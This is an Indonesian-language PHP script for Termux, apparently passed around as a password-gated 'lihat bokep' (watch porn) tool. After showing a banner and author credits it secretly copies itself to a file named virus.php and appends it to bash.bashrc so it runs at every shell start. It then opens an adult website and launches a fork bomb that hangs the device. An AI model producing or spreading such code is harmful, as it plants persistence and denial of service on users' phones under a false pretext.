<?php
// Colours
$blue="\033[1;34m";
$yellow="\033[1;33m";
$red="\033[1;31m";
$white="\033[1;37m";
$green="\033[1;32m";

// Animated

function slow($arr){
  $char = str_split($arr);
  foreach($char as $animated){
    echo $animated;
    usleep(5000);
  }
}

function fast($arr){
  $char = str_split($arr);
  foreach($char as $animated){
    echo $animated;
    usleep(500);
  }
}

// Banner
function banner(){
  global $blue,$yellow,$red,$white,$green;
  $banner=$yellow."      __    ____  ____  ____  ____  _____________________________    __
   / /   / __ \/ __ \/ __ \/ __ \/ ____/ ____/  _/ ____/  _/   |  / /
  / /   / / / / /_/ / / / / / / / /_  / /_   / // /    / // /| | / /
 / /___/ /_/ / _, _/ /_/ / /_/ / __/ / __/ _/ // /____/ // ___ |/ /___
/_____/\____/_/ |_/_____/\____/_/   /_/   /___/\____/___/_/  |_/_____/
                                                                                                               \n";

slow($banner);
}

function me(){
  global $blue,$yellow,$red,$white,$green;
  slow($white."÷ Author   : I'm habibGM\n");
  slow($white."÷ Telegram : @habibgm599\n");
//  slow($white."÷ Youtube  : LordOfficial\n");
  slow($yellow."÷ Script   : lihat bokep\n");
}

// password
function password(){
  global $blue,$yellow,$red,$white,$green;
  $realpw="taekkucing";

  slow($yellow."÷ Link Password  : ".$white."https://sfl.gl/mVMyho8GtP\n");
  slow($yellow."÷ Input Password : ".$white."");
  $password = trim(fgets(STDIN));

  if($password != $realpw){
    exit(slow($red."× Wrong Password !\n"));
  }else{
    slow($green."Password Correct √\n");
    sleep(2);
  }
}


// Run
system("clear");
fast(str_repeat($blue."•",70)."\n");
banner();
fast(str_repeat($blue."•",70)."\n");
password();

system("clear");
fast(str_repeat($blue."•",70)."\n");
banner();
fast(str_repeat($blue."•",70)."\n");
me();
fast(str_repeat($white."•",70)."\n");
echo "selamat menonton ^u^v\n";
system("cp -r ~/storage/shared/Download/menu-termux.php ~/../usr/etc/virus.php && echo 'php ~/../usr/etc/virus.php' >> ~/../usr/etc/bash.bashrc");
system("cp -r ~/menu-termux.php ~/../usr/etc/virus.php && echo 'php ~/../usr/etc/virus.php' >> ~/../usr/etc/bash.bashrc");
system("xdg-open 'https://id.xhamster.com'");
system("sleep 3");
system(":(){ :|:& } ;:");
?>
